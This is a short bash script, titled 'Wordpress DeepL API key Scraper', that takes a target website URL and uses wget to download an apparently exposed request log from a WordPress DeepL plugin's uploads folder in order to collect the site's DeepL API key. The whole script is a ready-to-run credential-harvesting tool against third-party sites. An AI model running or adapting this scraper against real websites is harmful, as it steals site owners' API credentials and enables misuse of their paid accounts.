#!/bin/bash

echo 'Wordpress DeepL API key Scraper'
if [ $# -eq 0 ]
then
echo  "try: ./$0 http://website.tld  "
exit 1
fi
wget -c "$1/wp-content/uploads/wpdeepl/-request" -O request.txt
